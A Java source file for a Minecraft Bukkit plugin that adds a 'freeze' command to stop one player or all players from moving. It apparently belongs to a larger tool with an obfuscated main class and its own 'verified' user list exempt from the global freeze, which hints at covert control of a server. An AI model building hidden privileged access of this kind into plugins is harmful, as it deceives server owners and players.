package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerMoveEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class Freeze implements Command, Listener {
    private final ArrayList<UUID> toggled = new ArrayList<>();
    private boolean freezeAll = false;
    private Z_ z;

    @Override
    public String[] getCommands() {
        return new String[]{"freeze"};
    }

    @Override
    public String getDescription() {
        return "Freezes a player.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "freeze <player | *>");
            return;
        }

        if (args[0].equals("*")) {
            this.freezeAll = !this.freezeAll;
            if (!freezeAll) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "All players are no longer frozen!");
            } else {
                sender.sendMessage(Colors.Prefix + Colors.Success + "All players are now frozen!");
            }

            return;
        }

        Player selected = Bukkit.getPlayer(args[0]);
        if (selected == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        if (toggled.contains(selected.getUniqueId())) {
            toggled.remove(selected.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Failure + selected.getName() + " was unfrozen!");
            return;
        }

        toggled.add(selected.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Success + selected.getName() + " was frozen!");
    }

    @Override
    public void onEnable(Z_ z) {
        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    private void playerMove(PlayerMoveEvent e) throws IOException, InterruptedException {
        Player p = e.getPlayer();

        if (toggled.contains(p.getUniqueId())) {
            e.setCancelled(true);
        }

        if (!this.z.getAuth().isVerified(p.getName()) && this.freezeAll) {
            e.setCancelled(true);
        }
    }
}
